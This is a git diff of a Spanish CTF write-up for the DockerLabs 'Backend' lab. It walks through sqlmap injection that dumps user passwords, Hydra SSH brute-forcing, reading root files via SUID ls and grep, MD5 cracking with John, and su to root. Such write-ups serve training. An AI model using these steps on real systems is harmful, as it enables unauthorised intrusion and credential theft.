@@ -1,20 +1,34 @@
-# **Máquina: Backend**
+# 🧠 **Informe de Pentesting – Máquina: Backend**
 
-### **Dificultad:** Fácil
+### 💡 **Dificultad:** Fácil
 
-### 📝 **Descripción:**
+### 🧩 **Plataforma:** DockerLabs
+
+### 🕵️‍♂️ **Tipo de ataque:** Inyección SQL + Escalada de privilegios con SUID
 
 
-### 🎯 **Objetivo:**
-
-
-![Logo](Imágenes/2025-05-17_19-35.png)
+![Despliegue](Imágenes/2025-05-17_19-35.png)
 
 ---
 
-## 🖥️ **Despliegue de la máquina**
+## 📝 **Descripción de la máquina**
 
-Descargamos el archivo `backend.zip`, lo descomprimimos y desplegamos la máquina usando el script `auto_deploy.sh` proporcionado. Esto inicia la máquina vulnerable dentro de un contenedor Docker:
+La máquina vulnerable **Backend** simula un entorno real donde un servidor web mal configurado expone una aplicación con una página de login vulnerable a **inyección SQL**. A partir de esta vulnerabilidad, el atacante puede acceder a la base de datos y obtener credenciales de usuarios, lo que abre la puerta para conectarse vía **SSH** y escalar privilegios localmente explotando binarios mal configurados con **permisos SUID**.
+
+---
+
+## 🎯 **Objetivo**
+
+* Detectar y explotar una vulnerabilidad de **inyección SQL** para obtener acceso a credenciales del sistema.
+* Utilizar estas credenciales para acceder al servidor mediante **SSH**.
+* Escalar privilegios a **root** mediante técnicas de post-explotación.
+* Capturar la **flag final o archivo sensible** como prueba de acceso total.
+
+---
+
+## ⚙️ **Despliegue de la máquina**
+
+Se descarga el archivo comprimido de la máquina vulnerable y se lanza el contenedor Docker mediante el script incluido:
 
 ```bash
 unzip backend.zip
@@ -27,7 +41,7 @@ sudo bash auto_deploy.sh backend.tar
 
 ## 📡 **Comprobación de conectividad**
 
-Verificamos la conexión con un simple `ping` a la IP asignada (172.17.0.3):
+Verificamos que la máquina se encuentra activa respondiendo a peticiones ICMP (ping):
 
 ```bash
 ping -c1 172.17.0.3
@@ -37,158 +51,233 @@ ping -c1 172.17.0.3
 
 ---
 
-## 🔍 **Escaneo de puertos**
+## 🔍 **Escaneo de Puertos**
 
-Ejecutamos un escaneo de puertos completo con `nmap`:
+Realizamos un escaneo completo para detectar todos los puertos abiertos:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
 ```
 
-Puertos descubiertos:
+**Puertos detectados:**
 
-* **22/tcp** – SSH
-* **80/tcp** – HTTP
+* `22/tcp`: SSH
+* `80/tcp`: HTTP
 
 ![Puertos](Imágenes/Capturas_2.png)
 
-Posteriormente, realizamos un escaneo más detallado sobre los puertos encontrados:
+Luego, analizamos los servicios y versiones asociados a esos puertos:
 
 ```bash
-nmap -sCV -p22,8009,8080 172.17.0.3 -oN target.txt
+nmap -sCV -p22,80 172.17.0.3 -oN target.txt
 ```
 
 ![Servicios](Imágenes/Capturas_3.png)
 
 ---
 
-Entre http://172.17.0.3/ en donde se encuntra alojado una pagina web donde se ecnotro que existe un login.html 
+## 🌐 **Análisis Web**
+
+Al acceder a `http://172.17.0.3/`, encontramos un sitio web básico con un archivo llamado `login.html`.
+
 ![Pagina](Imágenes/Capturas_4.png)
-
----
-
 ![login](Imágenes/Capturas_5.png)
 
-Comprobación de inyección SQL en el formulario de login
-
-Durante la fase de pruebas, se introdujo el carácter ' al final del campo de nombre de usuario en el formulario de inicio de sesión, lo cual provocó un error,Este mensaje de error revela que el sistema construye la consulta SQL de manera insegura, concatenando directamente el valor proporcionado por el usuario. La aparición del error de sintaxis confirma que no se están utilizando sentencias preparadas ni un adecuado filtrado de entrada, lo cual indica una vulnerabilidad a inyección SQL.
-![inyeccion](Imágenes/Capturas_6.png)
-
 ---
 
+## 🚨 **Detección de Inyección SQL**
+
+Se probó la introducción de una comilla simple `'` en el campo de usuario, generando un error SQL. Esto indica que la aplicación **no filtra correctamente las entradas del usuario**, exponiendo el backend a una **inyección SQL**.
+
+> Esta vulnerabilidad permite al atacante manipular las consultas SQL originales para acceder a datos confidenciales.
+
+![inyeccion](Imágenes/Capturas_6.png)
 ![error](Imágenes/Capturas_7.png)
 
-Ejecuto  sqlmap -u "http://172.17.0.3/login.html" --forms --batch --dbs contra la URL `http://172.17.0.3/login.html`, analizando formularios web para detectar vulnerabilidades de inyección SQL y, si es vulnerable pero ya confirmamos que tiene esta vulnerabilidad, asi que enumerara las bases de datos automáticamente sin intervención del usuario.
-Encontro:
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys
-[*] users
-![error](Imágenes/Capturas_8.png)
+---
 
-Usamos sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users --tables este comando usa sqlmap para analizar formularios en la página de login, buscar vulnerabilidades de inyección SQL y, si encuentra acceso, listar todas las tablas de la base de datos users automáticamente.
-![usuarios](Imágenes/Capturas_9.png)
+## 🧰 **Explotación Automática con SQLMap**
 
-Ahora se usa sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users -T usuarios --dump Este comando de sqlmap analiza el formulario web vulnerable, accede a la base de datos users, selecciona la tabla usuarios y extrae automáticamente todos sus registros sin necesidad de intervención del usuario.
-Se encontro:
-+----+---------------+----------+
-| id | password      | username |
-+----+---------------+----------+
-| 1  | $paco$123     | paco     |
-| 2  | P123pepe3456P | pepe     |
-| 3  | jjuuaann123   | juan     |
-+----+---------------+----------+
-![usuarios](Imágenes/Capturas_10.png)
+Utilizamos `sqlmap`, una poderosa herramienta de automatización de inyecciones SQL, para extraer las bases de datos, tablas y contenido sensible:
 
-Se puede probar estas credenciales manualmente pero yo use hydra cree dos .txt uno de usuarios y otro de contraseña y ejecute hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.3 -t 4 donde encontre las credenciañes de:
-[22][ssh] host: 172.17.0.3   login: pepe   password: P123pepe3456P
-![usuarios](Imágenes/Capturas_11.png)
+**1️⃣ Enumerar bases de datos:**
 
-Claro, aquí tienes una redacción clara y completa del **proceso que seguiste**, paso a paso, ideal para un informe técnico de pentesting:
+```bash
+sqlmap -u "http://172.17.0.3/login.html" --forms --batch --dbs
+```
+
+**Bases de datos encontradas:**
+
+* information\_schema
+* mysql
+* performance\_schema
+* sys
+* **users**
+
+![sqlmap](Imágenes/Capturas_8.png)
 
 ---
 
-## 🔍 Acceso por SSH y recolección de información
+**2️⃣ Listar tablas dentro de la base de datos `users`:**
 
-### 1. **Acceso inicial al sistema**
+```bash
+sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users --tables
+```
 
-Se logró acceder exitosamente al sistema remoto mediante SSH utilizando las siguientes credenciales obtenidas previamente:
+![usuarios](Imágenes/Capturas_9.png)
+
+---
+
+**3️⃣ Extraer datos de la tabla `usuarios`:**
+
+```bash
+sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users -T usuarios --dump
+```
+
+**Usuarios y contraseñas obtenidas:**
+
+| id | username | password            |
+| -- | -------- | ------------------- |
+| 1  | paco     | \$paco\$123         |
+| 2  | pepe     | **P123pepe3456P** ✅ |
+| 3  | juan     | jjuuaann123         |
+
+![usuarios](Imágenes/Capturas_10.png)
+
+---
+
+## 🔐 **Ataque de fuerza bruta con Hydra (opcional)**
+
+Creamos dos archivos: uno con los usuarios (`usuarios.txt`) y otro con las contraseñas (`contraseña.txt`) para probar credenciales contra el servicio SSH.
+
+```bash
+hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.3 -t 4
+```
+
+**Resultado exitoso:**
+
+```text
+[22][ssh] host: 172.17.0.3   login: pepe   password: P123pepe3456P
+```
+
+![usuarios](Imágenes/Capturas_11.png)
+
+---
+
+## 🧑‍💻 **Acceso al sistema y post-explotación**
+
+### ✅ **1. Acceso por SSH**
+
+Ingresamos exitosamente al sistema con:
 
 ```bash
 ssh pepe@172.17.0.3
 ```
 
-Durante la conexión se aceptó la huella digital del servidor y se ingresó la contraseña correspondiente al usuario `pepe`.
-
 ---
 
-### 2. **Verificación de privilegios**
+### 🔍 **2. Verificación de privilegios**
 
-Se intentó ejecutar el comando `sudo -l` para comprobar si el usuario `pepe` tenía permisos sudo, sin embargo, el sistema no tiene instalado `sudo`:
+Al ejecutar `sudo -l` descubrimos que el comando `sudo` **no está instalado**, por lo que debemos buscar métodos alternativos para escalar privilegios.
 
 ```bash
 sudo -l
-# Resultado:
-# -bash: sudo: command not found
+# Resultado: sudo: command not found
 ```
 
 ---
 
-### 3. **Búsqueda de binarios con SUID**
+### 🧱 **3. Búsqueda de binarios con SUID**
 
-Se utilizó `find` para localizar archivos con el bit SUID activado, que podrían permitir escalada de privilegios:
+Los binarios con el bit SUID activo pueden ser utilizados para ejecutar comandos con los privilegios de su propietario (incluso root). Usamos:
 
 ```bash
 find / -perm -4000 2>/dev/null
 ```
 
-Entre los resultados, destacan algunos binarios comunes con SUID:
-
-* `/usr/bin/ls`
-* `/usr/bin/grep`
-* `/usr/bin/passwd`
-* `/usr/bin/su`
-* ...
+Entre ellos, encontramos algunos interesantes como `ls`, `grep`, `su`, etc.
 
 ---
 
-### 4. **Acceso al directorio `/root`**
+### 🔓 **4. Acceso al directorio `/root` con SUID**
 
-Gracias a que `/usr/bin/ls` tiene el bit SUID activo, se pudo listar el contenido del directorio `/root`, normalmente inaccesible para usuarios sin privilegios:
+Gracias al binario `/usr/bin/ls` con SUID activado, listamos el contenido del directorio `/root`, normalmente restringido:
 
 ```bash
 /usr/bin/ls -la /root
 ```
 
-Esto permitió visualizar un archivo sospechoso:
+Encontramos el archivo:
 
-```bash
+```
 /root/pass.hash
 ```
 
 ---
 
-### 5. **Extracción del hash de contraseña**
+### 🧾 **5. Lectura del archivo con `grep` SUID**
 
-Se utilizó el binario `grep` (también con SUID) para extraer el contenido del archivo:
+Usamos `/usr/bin/grep`, también con SUID, para leer el archivo:
 
 ```bash
 /usr/bin/grep '' /root/pass.hash
-# Resultado:
+```
+
+**Resultado:**
+
+```
 e43833c4c9d5ac444e16bb94715a75e4
 ```
 
-Este valor corresponde a un **hash MD5**, posiblemente una contraseña de root o de un usuario privilegiado.
 ![contraseña](Imágenes/Capturas_13.png)
 
 ---
 
-Guarde el hash MD5 en un archivo llamado hash, luego uso John the Ripper con el diccionario rockyou.txt y formato Raw-MD5 para descifrar la contraseña oculta: spongebob34
+## 🔓 **Crackeo del hash con John the Ripper**
 
+Guardamos el hash en un archivo llamado `hash`, luego ejecutamos:
+
+```bash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+```
+
+**Contraseña obtenida:**
+
+```
+spongebob34
+```
+
 ![has](Imágenes/Capturas_12.png)
 
-Entramos a ssh como pepe y entramos a su root con las credenciales encontradas con exito
+---
+
+## 🧠 **Escalada final a ROOT**
+
+Con la contraseña obtenida, volvemos a entrar como `pepe` y usamos `su` para cambiar al usuario root:
+
+```bash
+su
+# Contraseña: spongebob34
+```
+
+Acceso concedido ✅
+¡Somos root!
+
 ![root](Imágenes/Capturas_14.png)
+
+---
+
+## 🏁 **Conclusión**
+
+La máquina *Backend* muestra de forma clara cómo una mala implementación en el manejo de entradas de usuario puede llevar a una **inyección SQL**, que posteriormente se traduce en **compromiso total del sistema**. El uso de herramientas como `sqlmap` y `john` permite automatizar el proceso de explotación, mientras que la correcta interpretación de permisos como el **SUID** demuestra cómo escalar privilegios eficazmente.
+
+🔓 **Resumen de pasos clave:**
+
+* Identificación de inyección SQL en `login.html`.
+* Explotación con sqlmap → credenciales obtenidas.
+* Acceso vía SSH con `pepe:P123pepe3456P`.
+* Abuso de binarios SUID (`ls`, `grep`) para leer archivos root.
+* Descifrado de hash MD5 con John → contraseña de root.
+* Escalada a root con `su`.
+
+---
